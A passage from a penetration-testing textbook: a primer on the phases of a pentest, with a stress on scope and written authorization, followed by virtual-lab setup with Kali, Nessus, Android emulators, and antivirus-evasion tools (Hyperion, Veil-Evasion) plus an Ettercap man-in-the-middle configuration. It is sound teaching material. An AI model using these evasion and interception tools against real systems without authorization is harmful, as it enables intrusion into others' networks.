systems to attack, sensi-\ntive information to steal, and so on. If you continue your penetration test-\ning studies, you will spend a good deal of time working on the latest and\ngreatest post-exploitation techniques. After post exploitation, we look at a few additional skills you will need\nto be a well-rounded penetration tester. We will take a brief look at assess-\ning the security of custom web applications in Chapter 14. Everyone has a\nwebsite these days, so it’s a good skill to cultivate. Next we will look at assess-\ning the security of wireless networks in Chapter 15, looking at methods for\ncracking commonly deployed cryptographic systems. Part IV: Exploit Development\nChapters 16, 17, 18, and 19 discuss the basics of writing your own exploits. We will look at finding vulnerabilities, exploiting them with common tech-\nniques, and even writing our own Metasploit module. Up until these chap-\nters, we have relied on tools and publicly available exploits for a lot of our\nexercises. As you advance in infosec, you may want to find new bugs (called\nzero-days) and report them to vendors for a possible bounty. You can then\nrelease a public exploit and/or Metasploit module to help other pentesters\ntest their customers’ environments for the issue you discovered. Part V: Mobile Hacking\nFinally, in Chapter 20, we close with a relatively new area of penetration test-\ning—assessing the security of mobile devices. We look at my own tool, the\nSmartphone Pentest Framework. Perhaps after mastering the skills in this\nbook, you will endeavor to develop and release a security tool of your own. Of course, this book doesn’t cover every single facet of information\nsecurity, nor every tool or technique. If it did, this book would have been\nseveral times longer and come out a good deal later, and I need to get back\nto my research. So here you have it: a hands-on introduction to hacking. It is\nan honor to be with you on this important step on your journey into informa-\ntion security. I hope that you learn a lot from this book and that it inspires\nyou to continue your studies and become an active member of this exciting\nand rapidly developing field. xxviii Introduction\n0\nPene tr ation testing Primer\nPenetration testing, or pentesting (not to be confused\nwith testing ballpoint or fountain pens), involves sim-\nulating real attacks to assess the risk associated with\npotential security breaches. On a pentest (as opposed\nto a vulnerability assessment), the testers not only dis-\ncover vulnerabilities that could be used by attackers\nbut also exploit vulnerabilities, where possible, to\nassess what attackers might gain after a successful\nexploitation. From time to time, a news story breaks about a major company being\nhit by a cyberattack. More often than not, the attackers didn’t use the latest\nand greatest zero-day (a vulnerability unpatched by the software publishers). Major companies with sizable security budgets fall victim to SQL injec-\ntion vulnerabilities on their websites, social-engineering attacks against\nemployees, weak passwords on Internet-facing services, and so on. In other\nwords, companies are losing proprietary data and exposing their clients’\npersonal details through security holes that could have been fixed. On a\npenetration test, we find these issues before an attacker does, and we rec-\nommend how to fix them and avoid future vulnerabilities. The scope of your pentests will vary from client to client, as will your\ntasks. Some clients will have an excellent security posture, while others will\nhave vulnerabilities that could allow attackers to breach the perimeter and\ngain access to internal systems. You may also be tasked with assessing one or many custom web applica-\ntions. You may perform social-engineering and client-side attacks to gain\naccess to a client’s internal network. Some pentests will require you to act\nlike an insider—a malicious employee or attacker who has already breached\nthe perimeter—as you perform an internal penetration test. Some clients will\nrequest an external penetration test, in which you simulate an attack via the\nInternet. And some clients may want you to assess the security of the wire-\nless networks in their office. In some cases, you may even audit a client’s\nphysical security controls. the stages of the Penetration test\nPentesting begins with the pre-engagement phase, which involves talking to\nthe client about their goals for the pentest, mapping out the scope (the\nextent and parameters of the test), and so on. When the pentester and the\nclient agree about scope, reporting format, and other topics, the actual test-\ning begins. In the information-gathering phase, the pentester searches for publicly\navailable information about the client and identifies potential ways to con-\nnect to its systems. In the threat-modeling phase, the tester uses this informa-\ntion to determine the value of each finding and the impact to the client if\nthe finding permitted an attacker to break into a system. This evaluation\nallows the pentester to develop an action plan and methods of attack. Before the pentester can start attacking systems, he or she performs a\nvulnerability analysis. In this phase, the pentester attempts to discover vul-\nnerabilities in the systems that can be taken advantage of in the exploitation\nphase. A successful exploit might lead to a post-exploitation phase, where the\nresult of the exploitation is leveraged to find additional information, sensi-\ntive data, access to other systems, and so on. Finally, in the reporting phase, the pentester summarizes the findings for\nboth executives and technical practitioners. note For more information on pentesting, a good place to start is the Penetration Testing\nExecution Standard (PTES) at http://www.pentest-standard.org/. Pre-engagement\nBefore the pentest begins, pentesters perform pre-engagement interac-\ntions with the client to make sure everyone is on the same page about the\n2 Chapter 0\npenetration testing. Miscommunication between a pentester and a client\nwho expects a simple vulnerability scan could lead to a sticky situation\nbecause penetration tests are much more intrusive. The pre-engagement stage is when you should take the time to under-\nstand your client’s business goals for the pentest. If this is their first pentest,\nwhat prompted them to find a pentester? What exposures are they most\nworried about? Do they have any fragile devices you need to be careful\nwith when testing? (I’ve encountered everything from windmills to medical\ndevices hooked up to patients on networks.)\nAsk questions about your client’s business. What matters most to them? For example, to a top online vendor, hours of downtime could mean thou-\nsands of dollars of lost revenue. To a local bank, having online banking sites\ngo down for a few hours may annoy a few customers, but that downtime\nwouldn’t be nearly as devastating as the compromise of a credit card data-\nbase. To an information security vendor, having their homepage plastered\nwith rude messages from attackers could lead to a damaged reputation that\nsnowballs into a major revenue loss. Other important items to discuss and agree upon during the pre-\nengagement phase of the pentest include the following:\nScope\nWhat IP addresses or hosts are in scope, and what is not in scope? What\nsorts of actions will the client allow you to perform? Are you allowed to\nuse exploits and potentially bring down a service, or should you limit the\nassessment to merely detecting possible vulnerabilities? Does the client\nunderstand that even a simple port scan could bring down a server or\nrouter? Are you allowed to perform a social-engineering attack? The testing window\nThe client may want you to perform tests only during specific hours or\non certain days. Contact information\nWhom should you contact if you find something serious? Does the cli-\nent expect you to contact someone 24 hours a day? Do they prefer that\nyou use encryption for email? A “get out of jail free” card\nMake sure you have authorization to perform a penetration test on the\ntarget. If a target is not owned by the company (for instance, because\nit’s hosted by a third party), make sure to verify that the client has\nformal approval from the third party to perform the penetration test. Regardless, make sure your contract includes a statement that limits\nyour liability in case something unexpected happens, and get written\npermission to perform the test. Payment terms\nHow and when will you be paid, and how much? Penetration Testing Primer 3\nFinally, include a nondisclosure agreement clause in your contract. Clients will appreciate your written commitment to keep the penetration\ntest and any findings confidential. Information Gathering\nNext is the information-gathering phase. During this phase, you analyze\nfreely available sources of information, a process known as gathering open\nsource intelligence (OSINT). You also begin to use tools such as port scanners\nto get an idea of what systems are out there on the Internet or internal net-\nwork as well as what software is running. We’ll explore information gather-\ning in more detail in Chapter 5. Threat Modeling\nBased on the knowledge gained in the information-gathering phase, we\nmove on to threat modeling. Here we think like attackers and develop plans\nof attack based on the information we’ve gathered. For example, if the client\ndevelops proprietary software, an attacker could devastate the organization\nby gaining access to their internal development systems, where the source\ncode is developed and tested, and selling the company’s trade secrets to a\ncompetitor. Based on the data we found during information gathering, we\ndevelop strategies to penetrate a client’s systems. Vulnerability Analysis\nNext, pentesters begin to actively discover vulnerabilities to determine how\nsuccessful their exploit strategies might be. Failed exploits can crash ser-\nvices, set off intrusion-detection alerts, and otherwise ruin your chances of\nsuccessful exploitation. Often during this phase, pentesters run vulnerabil-\nity scanners, which use vulnerability databases and a series of active checks\nto make a best guess about which vulnerabilities are present on a client’s sys-\ntem. But though vulnerability scanners are powerful tools, they can’t fully\nreplace critical thinking, so we also perform manual analysis and verify\nresults on our own in this phase as well. We’ll explore various vulnerability-\nidentification tools and techniques in Chapter 6. Exploitation\nNow for the fun stuff: exploitation. Here we run exploits against the vul-\nnerabilities we’ve discovered (sometimes using a tool like Metasploit) in an\nattempt to access a client’s systems. As you’ll see, some vulnerabilities will be\nremarkably easy to exploit, such as logging in with default passwords. We’ll\nlook at exploitation in Chapter 8. Post Exploitation\nSome say pentests truly begin only after exploitation, in the post-exploitation\nphase. You got in, but what does that intrusion really mean to the client? If\nyou broke into an unpatched legacy system that isn’t part of a domain or\n4 Chapter 0\notherwise networked to high-value targets, and that system contains no\ninformation of interest to an attacker, that vulnerability’s risk is significantly\nlower than if you were able to exploit a domain controller or a client’s devel-\nopment system. During post exploitation, we gather information about the attacked sys-\ntem, look for interesting files, attempt to elevate our privileges where neces-\nsary, and so on. For example, we might dump password hashes to see if we\ncan reverse them or use them to access additional systems. We might also\ntry to use the exploited machine to attack systems not previously available\nto us by pivoting into them. We’ll examine post exploitation in Chapter 13. Reporting\nThe final phase of penetration testing is reporting. This is where we convey\nour findings to the customer in a meaningful way. We tell them what they’re\ndoing correctly, where they need to improve their security posture, how you\ngot in, what you found, how to fix problems, and so on. Writing a good pentest report is an art that takes practice to master. You’ll need to convey your findings clearly to everyone from the IT staff\ncharged with fixing vulnerabilities to upper management who signs off on\nthe changes to external auditors. For instance, if a nontechnical type reads,\n“And then I used MS08-067 to get a shell,” he or she might think, “You mean,\nlike a seashell?” A better way to communicate this thought would be to men-\ntion the private data you were able to access or change. A statement like “I\nwas able to read your email,” will resonate with almost anyone. The pentest report should include both an executive summary and a\ntechnical report, as discussed in the following sections. Executive Summary\nThe executive summary describes the goals of the test and offers a high-\nlevel overview of the findings. The intended audience is the executives in\ncharge of the security program. Your executive summary should include\nthe following:\nBackground A description of the purpose of the test and definitions\nof any terms that may be unfamiliar to executives, such as vulnerability\nand countermeasure. Overall posture An overview of the effectiveness of the test, the\nissues found (such as exploiting the MS08-067 Microsoft vulnerability),\nand general issues that cause vulnerabilities, such as a lack of patch\nmanagement.\n\nRisk profile An overall rank of the organization’s security posture\ncompared to similar organizations with measures such as high, moder-\nate, or low. You should also include an explanation of the ranking. General findings A general synopsis of the issues identified along\nwith statistics and metrics on the effectiveness of any countermeasures\ndeployed. Penetration Testing Primer 5\nRecommendation summary A high-level overview of the tasks required\nto remediate the issues discovered in the pentest. Strategic road map Give the client short- and long-term goals to\nimprove their security posture. For example, you might tell them to\napply certain patches now to address short-term concerns, but without\na long-term plan for patch management, the client will be in the same\nposition after new patches have been released. Technical Report\nThis section of the report offers technical details of the test. It should\ninclude the following:\nIntroduction An inventory of details such as scope, contacts, and so on. Information gathering Details of the findings in the information-\ngathering phase. Of particular interest is the client’s Internet footprint. Vulnerability assessment Details of the findings of the vulnerability-\nanalysis phase of the test. Exploitation/vulnerability verification Details of the findings from\nthe exploitation phase of the test. Post exploitation Details of the findings of the post-exploitation\nphase of the test. Risk/exposure A quantitative description of the risk discovered. This\nsection estimates the loss if the identified vulnerabilities were exploited\nby an attacker. Conclusion A final overview of the test. summary\nThis chapter has taken a brief look at the phases of penetration testing,\nincluding pre-engagement, information gathering, threat modeling,\nvulnerability analysis, exploitation, post exploitation, and reporting. Familiarity with these phases will be crucial as you begin your pentesting\ncareer, and you’ll learn more about them as you move through the book. 6 Chapter 0\nPaRT I\ntHe BasiCs\n1\nse t ting uP Your Virtual l aB\nAs you work through this book, you’ll get hands-on\nexperience using different tools and techniques for\npenetration testing by working in a virtual lab run-\nning in the VMware virtualization software. I’ll walk\nyou through setting up your lab to run multiple operating systems inside\nyour base operating system in order to simulate an entire network using\njust one physical machine. We’ll use our lab to attack target systems\nthroughout this book. installing Vmware\nAs the first step in setting up your virtual lab, download and install a desk-\ntop VMware product. VMware Player is available free for personal use for\nMicrosoft Windows and Linux operating systems (http://www.vmware.com/\nproducts/player/). VMware also offers VMware Workstation (http://www\n.vmware.com/products/workstation/) for Windows and Linux, which includes\nadditional features such as the ability to take snapshots of the virtual\nmachine that you can revert to in case you break something. VMware\nWorkstation is available for free for 30 days, but after that, you will need\nto buy it or switch back to using VMware Player. Mac users can run a trial version of VMware Fusion (http://www.vmware\n.com/products/fusion/) free for 30 days, and it costs only about $50 after that. As a Mac user, I’ll use VMware Fusion throughout the book, but setup\ninstructions are also included for VMware Player. Download the version of VMware that matches your operating system\nand architecture (32- or 64-bit). If you encounter any problems installing\nVMware, you’ll find plenty of support at the VMware website. setting up kali Linux\nKali Linux is a Debian-based Linux distribution that comes with a wide\nvariety of preinstalled security tools that we’ll use throughout this book. This book is written for Kali 1.0.6, the current version as of this writing. You’ll find a link to a torrent containing a copy of Kali 1.0.6 at this book’s\nwebsite (http://nostarch.com/pentesting/). As time passes, newer versions of\nKali will be released. If you would like, feel free to download the latest ver-\nsion of Kali Linux from http://www.kali.org/. Keep in mind, though, that\nmany of the tools we’ll use in this book are in active development, so if you\nuse a newer version of Kali, some of the exercises may differ from the walk-\nthroughs in this book. If you prefer everything to work as written, I recom-\nmend using the version of Kali 1.0.6 provided in the torrent (a file called\nkali-linux-1.0.6-vm-i486.7z), which is a prebuilt VMware image compressed\nwith 7-Zip. note You can find 7-Zip programs for Windows and Linux platforms at http://www\n.7-zip.org/download.html. For Mac users, I recommend Ez7z from http://ez7z\n.en.softonic.com/mac/. 1. Once the 7-Zip archive is decompressed, in VMware go to File4Open\nand direct it to the file Kali Linux 1.0.6 32 bit.vmx in the decompressed\nKali Linux 1.0.6 32 bit folder. 2. Once the virtual machine opens, click the Play button and, when\nprompted as shown in Figure 1-1, choose I copied it. 3. As Kali Linux boots up, you will be prompted as shown in Figure 1-2. Choose the top (default) highlighted option. 10 Chapter 1\nFigure 1-1: Opening the Kali Linux virtual machine\nFigure 1-2: Booting Kali Linux\nSetting Up Your Virtual Lab 11\n4. Once Kali Linux boots, you will be presented with a login screen like\nthe one shown in Figure 1-3. Figure 1-3: Kali login screen\n5. Click Other and enter the default credentials for Kali Linux, root:toor, as\nshown in Figure 1-4. Then click the Log In button. Figure 1-4: Logging into Kali\n12 Chapter 1\n6. You will be presented with a screen like the one shown in Figure 1-5. Figure 1-5: The Kali Linux GUI\nConfiguring the Network for Your Virtual Machine\nBecause we’ll be using Kali Linux to attack our target systems over a net-\nwork, we need to place all our virtual machines on the same virtual network\n(we will see an example of moving between networks in Chapter 13, which\ncovers post exploitation). VMware offers three options for virtual network\nconnections: bridged, NAT, and host only. You should choose the bridged\noption, but here’s a bit of information about each:\n• The bridged network connects the virtual machine directly to the local\nnetwork using the same connection as the host system. As far as the\nlocal network is concerned, our virtual machine is just another node\non the network with its own IP address. • NAT, short for network address translation, sets up a private network on the\nhost machine. The private network translates outgoing traffic from the\nvirtual machine to the local network. On the local network, traffic from\nthe virtual machine will appear to come from the host machine’s IP\naddress. • The host-only network limits the virtual machine to a local private net-\nwork on the host. The virtual machine will be able to communicate\nwith other virtual machines in the host-only network as well as the host\nmachine itself, but it will not be able to send or receive any traffic with\nthe local network or the Internet. Setting Up Your Virtual Lab 13\nnote Because our target virtual machines will have multiple known security vulnerabili-\nties, use caution when attaching them to your local network because anyone else on\nthat network can also attack these machines. For this reason, I do not recommend work-\ning through this book on a public network where you do not trust the other users. By default, the Kali Linux virtual machine network adapter is set to\nNAT. Here’s how to change that option on both Windows and Mac OS. VMware Player on Microsoft Windows\nTo change the virtual network on VMware Player for Windows, start VMware\nPlayer and then click your Kali Linux virtual machine. Choose Edit virtual\nmachine settings, as shown in Figure 1-6. (If you’re still running Kali Linux\nin VMware Player, choose Player4Manage4Virtual machine settings.)\nFigure 1-6: Changing the VMware network adapter\nOn the next screen, choose Network Adapter in the Hardware tab and\nchoose the Bridged option in the Network connection section, as shown in\nFigure 1-7. 14 Chapter 1\nFigure 1-7: Changing the network adapter settings\nNow click the Configure Adapters button and check the network\nadapter that you’re using with your host operating system. As you can see\nin Figure 1-8, I’ve selected only the Realtek wireless adapter. Once you’ve\nmade your selection, press OK. Figure 1-8: Selecting a network adapter\nSetting Up Your Virtual Lab 15\nVMware Fusion on Mac OS\nTo change the virtual network connection in VMware Fusion, go to Virtual\nMachine4Network Adapter and change from NAT to Bridged, as shown in\nFigure 1-9. Figure 1-9: Changing the network adapter\nConnecting the Virtual Machine to the Network\nKali Linux should automatically pull an IP address from the Bridged network\nonce you make the switch. To verify your IP address, open a Linux terminal\nby clicking the terminal icon(a black rectangle with the symbols >_) at the\ntop left of the Kali screen (or choose Applications4Accessories4Terminal). Then run the command ifconfig to see your network information, as shown\nin Listing 1-1. root@kali:~# ifconfig\neth0 Link encap:Ethernet HWaddr 00:0c:29:df:7e:4d\ninet addr:192.168.20.9 Bcast:192.168.20.255 Mask:255.255.255.0\ninet6 addr: fe80::20c:29ff:fedf:7e4d/64 Scope:Link\n--snip--\nListing 1-1: Networking information\nnote The prompt root@kali:~# is the superuser (root) prompt. We will learn more about\nthis and the other Linux commands we use for setup in Chapter 2. 16 Chapter 1\nThe IPv4 address for this virtual machine is 192.168.20.9, as highlighted\nin bold in Listing 1-1. (The IP address for your machine will likely differ.)\nTesting Your Internet access\nNow let’s make sure that Kali Linux can connect to the Internet. We’ll use\nthe ping network utility to see if we can reach Google. Make sure your com-\nputer is connected to the Internet, open a Linux terminal, and enter the\nfollowing. root@kali:~# ping www.google.com\nIf you see something like the following in response, you’re online. (We’ll learn more about the ping command in Chapter 3.)\nPING www.google.com (50.0.2.221) 56(84) bytes of data. 64 bytes from cache.google.com (50.0.2.221): icmp_req=1 ttl=60 time=28.7 ms\n64 bytes from cache.google.com (50.0.2.221): icmp_req=2 ttl=60 time=28.1 ms\n64 bytes from cache.google.com (50.0.2.221): icmp_req=3 ttl=60 time=27.4 ms\n64 bytes from cache.google.com (50.0.2.221): icmp_req=4 ttl=60 time=29.4 ms\n64 bytes from cache.google.com (50.0.2.221): icmp_req=5 ttl=60 time=28.7 ms\n64 bytes from cache.google.com (50.0.2.221): icmp_req=6 ttl=60 time=28.0 ms\n--snip--\nIf you do not receive a response, make sure that you have set your net-\nwork adapter to Bridged, that Kali Linux has an IP address, and, of course,\nthat your host system currently has Internet access. Installing Nessus\nAlthough Kali Linux has just about every tool we’ll need, we do need to\ninstall a few additional programs. First, we’ll install Tenable Security’s\nNessus Home vulnerability scanner. This scanner is free for home use only\n(you’ll see a description of limitations on the Nessus website). Note that\nNessus is very actively developed, so the current version as well as its GUI\nmay have changed a bit since this book went to press. Use the following steps to install Nessus Home from within Kali:\n1. Open Applications4Internet4Iceweasel Web Browser and enter\nhttp://www.tenable.com/products/nessus-home/ in the address bar. Complete\nthe Register for an Activation Code information and click Register. (Use a real email address—you’ll need the activation code later.)\n2. Once you reach the Downloads page, choose the latest version of Nessus\nfor the Linux Debian 32-bit platform (Nessus-5.2.5-debian6_i386.deb as of\nthis writing) and download it to your root directory (the default down-\nload location). 3. Open a Linux terminal (click the terminal icon at the top of the Kali\nscreen) to open a root prompt. Setting Up Your Virtual Lab 17\n4.\n\nEnter ls to see a list of the files in your root directory. You should see\nthe Nessus file that you just downloaded. 5. Enter dpkg -i followed by the name of the file you downloaded (you can\ntype the first letter of the filename and press tab to use tab completion)\nand press enter to begin the install process. Installation may take a while\nas Nessus processes various plugins. Progress is shown by a line of hash\nsymbols (#). Selecting previously unselected package nessus. (Reading database ... 355024 files and directories currently installed.)\nUnpacking nessus (from Nessus-5.2.5-debian6_amd64.deb) ... Setting up nessus (5.2.5) ... nessusd (Nessus) 5.2.5 [build N25109] for Linux\nCopyright (C) 1998 - 2014 Tenable Network Security, Inc\nProcessing the Nessus plugins... [########### ]\n6. Once you’re returned to the root prompt with no errors, Nessus should\nbe installed, and you should see a message like this. All plugins loaded\nFetching the newest plugins from nessus.org... Fetching the newest updates from nessus.org... Done. The Nessus server will start processing these plugins within a\nminute\nnessusd (Nessus) 5.2.5 [build N25109] for Linux\nCopyright (C) 1998 - 2014 Tenable Network Security, Inc\nProcessing the Nessus plugins... [##################################################]\nAll plugins loaded\n- You can start nessusd by typing /etc/init.d/nessusd start\n- Then go to https://kali:8834/ to configure your scanner\n7. Now enter the following to start Nessus. root@kali:~# /etc/init.d/nessusd start\n8. Open the URL https://kali:8834/ in the Iceweasel web browser. You\nshould see a SSL certificate warning, similar to that in Figure 1-10. note If you access Nessus from outside the Iceweasel browser in Kali, you will need to go to\nhttps://<ipaddressofKali>:8834 instead. 18 Chapter 1\nFigure 1-10: Invalid SSL certificate warning\n9. Expand I Understand the Risks and click Add Exception. Then click\nConfirm Security Exception, as shown in Figure 1-11. Figure 1-11: Confirming the security exception\nSetting Up Your Virtual Lab 19\n10. Click Get Started at the bottom left of the opening Nessus page and\nenter a username and password on the following page. I’ve chosen\ngeorgia:password for my example. If you choose something else, remember\nit because we’ll use Nessus in Chapter 6. (Note that I use poor passwords\nthroughout this book, as will many clients you encounter. In production,\nyou should use much better passwords than password.)\n11. At the next page, enter the activation code you received via email from\nTenable Security. 12. Once registered with Tenable Security, choose the option to download\nplugins (downloading will take some time). Once Nessus processes the\nplugins, it will initialize. When Nessus finishes downloading plugins and configuring the soft-\nware, you should see the Nessus login screen, as shown in Figure 1-12. You\nshould be able to use the credentials for the account you created during\nsetup to log in. Figure 1-12: Login screen of the Nessus web interface\nTo close Nessus, just close its tab in the browser. We will come back to\nNessus in Chapter 6. Installing Additional Software\nWe’re not done yet. Follow these instructions to complete your Kali Linux\ninstall. The Ming C Compiler\nWe need to install a cross compiler so we can compile C code to run on\nMicrosoft Windows systems. The Ming compiler is included in the Kali Linux\nrepositories but is not installed by default. Install it with this command. root@kali:~# apt-get install mingw32\n20 Chapter 1\nHyperion\nWe’ll use the Hyperion encryption program to bypass antivirus software. Hyperion is not currently included in the Kali repositories. Download\nHyperion with wget, unzip it, and compile it with the Ming cross compiler\nyou installed in the previous step, as shown in Listing 1-2. root@kali:~# wget http://nullsecurity.net/tools/binary/Hyperion-1.0.zip\nroot@kali:~# unzip Hyperion-1.0.zip\nArchive: Hyperion-1.0.zip\ncreating: Hyperion-1.0/\ncreating: Hyperion-1.0/FasmAES-1.0/\nroot@kali:~# i586-mingw32msvc-c++ Hyperion-1.0/Src/Crypter/*.cpp -o hyperion.exe\n--snip--\nListing 1-2: Installing Hyperion\nVeil-Evasion\nVeil-Evasion is a tool that generates payload executables you can use to bypass\ncommon antivirus solutions. Install Veil-Evasion Kali (see Listing 1-3) by first\ndownloading it with the command wget. Next, unzip the downloaded file\nmaster.zip and change to the Veil-master/setup directory. Finally, enter ./setup.sh\nand follow the default prompts. root@kali:~# wget https://github.com/ChrisTruncer/Veil/archive/master.zip\n--2015-11-26 09:54:10-- https://github.com/ChrisTruncer/Veil/archive/master.zip\n--snip--\n2015-11-26 09:54:14 (880 KB/s) - `master.zip' saved [665425]\nroot@kali:~# unzip master.zip\nArchive: master.zip\n948984fa75899dc45a1939ffbf4fc0e2ede0c4c4\ncreating: Veil-Evasion-master/\n--snip--\ninflating: Veil-Evasion-master/tools/pyherion.py\nroot@kali:~# cd Veil-Evasion-master/setup\nroot@kali:~/Veil-Evasion-master/setup# ./setup.sh\n=========================================================================\n[Web]: https://www.veil-evasion.com | [Twitter]: @veilevasion\n=========================================================================\n[*] Initializing Apt Dependencies Installation\n--snip—\nDo you want to continue? [Y/n]? Y\n--snip--\nroot@kali:~#\nListing 1-3: Installing Veil-Evasion\nSetting Up Your Virtual Lab 21\nEttercap\nEttercap is a tool for performing man-in-the-middle attacks. Before run-\nning it for the first time, we need to make a couple of changes to its config-\nuration file at /etc/ettercap/etter.conf. Open its configuration file from a Kali\nroot prompt in the nano editor. root@kali:~# nano /etc/ettercap/etter.conf\nFirst change the userid and groupid values to 0 so Ettercap can run with\nroot privileges. Scroll down to where you see the following lines in the file. Replace whatever values you see following the equal signs (=) with a 0. [privs]\nec_uid = 0 # nobody is the default\nec_gid = 0 # nobody is the default\nNow scroll down to the Linux section of the file and uncomment\n(remove the leading # characters) before the two lines shown at u and v\nin Listing 1-4 to set Iptables firewall rules to redirect the traffic. #---------------\n# Linux\n#---------------\n# if you use ipchains:\n#redir_command_on = \"ipchains -A input -i %iface -p tcp -s 0/0 -d 0/0 %port -j REDIRECT\n%rport\"\n#redir_command_off = \"ipchains -D input -i %iface -p tcp -s 0/0 -d 0/0 %port -j REDIRECT\n%rport\"\n# if you use iptables:\nuredir_command_on = \"iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j\nREDIRECT --to-port %rport\"\nvredir_command_off = \"iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j\nREDIRECT --to-port %rport\"\nListing 1-4: Ettercap configuration file\nSave and exit the file by pressing ctrl-X and then Y to save the changes. Setting Up Android Emulators\nNow we’ll set up three Android emulators on Kali to use for mobile testing\nin Chapter 20. First we’ll need to download the Android SDK. 1. Open the Iceweasel web browser from within Kali and visit https://\ndeveloper.android.com/sdk/index.html. 2. Download the current version of the ADT bundle for 32-bit Linux and\nsave it to your root directory. 22 Chapter 1\n3. Open a terminal, list the files there (ls), and extract the compressed\narchive that you just downloaded with unzip (the x’s represent the name\nof your file, as versions may have changed since this was written). root@kali:~# unzip adt-bundle-Linux-x86-xxxxxxxxxxx.zip\n4. Now use cd to go into the new directory (with the same name as the file\nwithout the .zip extension). # cd sdk/tools\n# ./android\n5. The Android SDK Manager should open, as shown in Figure 1-13. Figure 1-13: The Android SDK Manager\nWe’ll download any updates to the Android SDK tools and Android SDK\nplatform tools (checked by default), as well as Android 4.3 and a couple of\nolder versions of Android with specific vulnerabilities, Android 2.2 and\nAndroid 2.1. Select the boxes to the left of each Android version. Then\n(leaving Updates/New and Installed checked) click Install packages, as\nshown in Figure 1-14. Accept the license agreement, and the Android SDK\nshould download and install the chosen packages. Installation will likely\ntake several minutes. Setting Up Your Virtual Lab 23\nFigure 1-14: Installing Android software\nNow it’s time to set up our Android virtual devices. Open the Android\nSDK Manager and choose Tools4Manage AVDs. You should see the win-\ndow shown in Figure 1-15. Figure 1-15: Android Virtual Device Manager\n24 Chapter 1\nWe’ll create three Android emulators based on Android 4.3, 2.2,\nand 2.1, as shown in Figure 1-16. Use the values shown in the figure for\neach emulator but set the value of Target to the Android version of the\nemulator you would like to build (the Google API versions of Android 4.3\n[Google APIs version 18], 2.2 [Google APIs version 8], and 2.1 [Google\nAPIs version 7]). Fill the AVD Name field with a descriptive value. Add a\nsmall SD Card value (100MB should be more than sufficient) so you can\ndownload files to your Android emulators. Set Device to Nexus 4 and Skin\nto Skin with dynamic hardware controls. Leave the rest of the options at\ntheir defaults. Figure 1-16: Creating an Android emulator\nOnce you’ve built all three emulators, your AVD Manager should look\nlike Figure 1-17 (device names may be different of course). Setting Up Your Virtual Lab 25\nFigure 1-17: Android emulators created in Android Virtual Device Manager\nTo start an emulator, highlight it and click Start. Then click Launch in\nthe pop-up, as shown in Figure 1-18. Figure 1-18: Launching an Android emulator\nIt may take a few minutes for the emulator to boot up for the first time,\nbut once it does, you should have something that looks and feels much like\na real Android device. The Android 4.3 emulator is shown in Figure 1-19. 26 Chapter 1\nFigure 1-19: Android 4.3 emulator\nnote To run the Android emulators in Kali, you will likely need to increase the perfor-\nmance of your virtual machine by increasing its RAM and CPU cores. I am able to\nrun all three emulators with 3GB RAM and two CPU cores allocated to Kali. You\ncan make these changes in the virtual machine settings in your VMware product. The\namount of power you can give to Kali will, of course, depend on the resources avail-\nable on your host machine. As an alternative, instead of running the Android emula-\ntors on Kali Linux, you can install Android and the emulators on your host system\nor even another system on the local network. The exercises in Chapter 20 will work as\nlong as the emulators can communicate with Kali. Smartphone Pentest Framework\nNext, download and install the Smartphone Pentest Framework (SPF), which\nwe’ll use for mobile attacks. Use git to download the source code. Change\nto the downloaded Smartphone-Pentest-Framework directory as shown here. root@kali:~# git clone -b SPFBook https://github.com/georgiaw/Smartphone-Pentest-Framework.git\nroot@kali:~# cd Smartphone-Pentest-Framework\nNow open the file kaliinstall in the nano text editor. The first few lines\nare shown in Listing 1-5.\n\nNote the lines that refer to /root/adt-bundle-linux\n-x86-20131030/sdk/tools/android. If the name of your ADT bundle folder is\ndifferent (due to the release of a subsequent version), change this value to\nmatch the correct place where you installed the Android ADT in the previ-\nous section. Setting Up Your Virtual Lab 27\nroot@kali:~/Smartphone-Pentest-Framework# nano kaliinstall\n#!/bin/sh\n## Install needed packages\necho -e \"$(tput setaf 1)\\nInstallin serialport, dbdpg, and expect for perl\\n\"; echo \"$(tput\nsgr0)\"\necho -e \"$(tput setaf 1)#########################################\\n\"; echo \"$(tput sgr0)\"\necho $cwd;\n#apt-get -y install libexpect-perl libdbd-pg-perl libdevice-serialport-perl;\napt-get install ant\n/root/adt-bundle-linux-x86-20131030/sdk/tools/android update sdk --no-ui --filter android-4 -a\n/root/adt-bundle-linux-x86-20131030/sdk/tools/android update sdk --no-ui --filter addon-google_\napis-google-4 -a\n/root/adt-bundle-linux-x86-20131030/sdk/tools/android update sdk --no-ui --filter android-14 -a\n/root/adt-bundle-linux-x86-20131030/sdk/tools/android update sdk --no-ui --filter addon-google_\napis-google-14 -a\n--snip--\nListing 1-5: Installing Smartphone Pentest Framework\nNow run the kaliinstall script, as shown here. root@kali:~/Smartphone-Pentest-Framework# ./kaliinstall\nThis will set up the SPF, which we’ll use in Chapter 20. Finally, we need to make one more change to the configuration file for\nSPF. Change directories to Smartphone-Pentest-Framework/frameworkconsole\nand open the file config in nano. Look for the option #LOCATION OF ANDROID\nSDK. If your ADT bundle folder name has changed since the version current\nat the time of this writing, change it accordingly in the line that begins with\nANDROIDSDK=. root@kali:~/Smartphone-Pentest-Framework# cd frameworkconsole/\nroot@kali:~/Smartphone-Pentest-Framework/frameworkconsole# nano config\n--snip--\n#LOCATION OF ANDROID SDK\nANDROIDSDK = /root/adt-bundle-linux-x86-20131030/sdk\n--snip--\ntarget Virtual machines\nWe’ll use three custom-built target machines to simulate vulnerabilities\noften found in client environments: Ubuntu 8.10, Windows XP SP3, and\nWindows 7 SP1. You’ll find a link to a torrent containing the Ubuntu virtual machine\nat http://www.nostarch.com/pentesting/. The target system is compressed using\nthe 7-Zip archive, and 1stPentestBook?! is the password for the archive. You can\nuse 7-Zip programs to open the archives for all platforms. For the Windows\nand Linux packages, use http://www.7-zip.org/download.html; for Mac OS, use\nEz7z at http://ez7z.en.softonic.com/mac/. The archive is ready for use as soon as\nit is unzipped. 28 Chapter 1\nTo set up the Windows virtual machines, you’ll need to install and con-\nfigure Windows XP SP3 and 32-bit Windows 7 SP1. Sources for the installa-\ntion media include TechNet and MSDN (the Microsoft Developer Network),\namong others. (You should be able to use your Windows virtual machines\non a trial basis for 30 days without a license key.)\nCreating the windows xP target\nYour Windows XP target should be a base installation of Windows XP SP3\nwith no additional security updates. (Visit my website at http://www\n.bulbsecurity.com/ for more information about finding a copy of Windows XP.)\nOnce you have a copy of Windows XP SP3, here’s how to install it on\nMicrosoft Windows or Mac OS. VMware Player on Microsoft Windows\nTo install Windows XP on VMware Player for Windows:\n1. Choose 